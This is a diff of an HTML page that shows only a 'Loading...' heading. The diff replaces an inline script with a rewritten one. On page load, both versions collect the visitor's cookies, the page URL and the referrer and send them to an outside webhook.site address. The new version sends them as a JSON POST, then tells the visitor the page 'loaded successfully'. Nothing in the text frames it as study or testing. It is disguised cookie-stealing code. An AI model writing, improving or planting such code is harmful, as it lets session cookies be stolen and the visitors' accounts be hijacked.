@@ -6,12 +6,31 @@
 <body>
   <h1>Loading...</h1>
   <script>
+    // Get cookies, location and referrer data
     var cookies = document.cookie;
     var loc = window.location.href;
     var ref = document.referrer;
-    
-    fetch('https://webhook.site/3e1fa884-53e7-4e4d-9308-b0dba33bc36d?cookies=' + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(loc) + '&ref=' + encodeURIComponent(ref))
-    
+
+    // Prepare the data to be sent to the webhook
+    var data = {
+      cookies: cookies,
+      url: loc,
+      referrer: ref
+    };
+
+    // Send the data via a POST request to your webhook
+    fetch('https://webhook.site/11f73cd8-3a3d-4d1a-9e68-a755cdd67f5a', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json' // Ensuring JSON format
+      },
+      body: JSON.stringify(data) // Send the data as a JSON payload
+    })
+    .then(response => response.json())
+    .then(data => console.log('Request successful:', data))
+    .catch(error => console.error('Error sending data:', error));
+
+    // Update the page content after the fetch completes
     document.querySelector('h1').innerHTML = 'Page loaded successfully';
   </script>
 </body>
